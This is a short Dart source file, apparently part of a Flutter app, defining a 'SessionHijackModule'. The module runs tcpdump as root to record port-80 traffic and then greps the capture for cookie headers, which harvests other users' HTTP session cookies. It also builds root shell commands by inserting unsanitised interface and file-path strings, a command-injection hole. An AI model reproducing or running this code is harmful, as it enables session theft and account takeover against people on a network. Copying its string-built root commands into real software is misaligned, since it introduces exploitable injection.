import 'dart:io';
import 'package:wimax_flutter/core/shell_executor.dart';

class SessionHijackModule {
  final ShellExecutor _shell = ShellExecutor();

  Future<String> startSessionCapture({required String interface, required String savePath}) async {
    final command = "tcpdump -i $interface port 80 -w $savePath";
    return await _shell.executeRootCommand(command);
  }

  Future<void> stopSessionCapture() async {
    await _shell.executeRootCommand("pkill tcpdump");
  }

  Future<List<String>> analyzeSessionFile(String filePath) async {
    final output = await _shell.executeCommand("tcpdump -r \"$filePath\" | grep -i \"cookie\"");
    return output.split('\n');
  }
}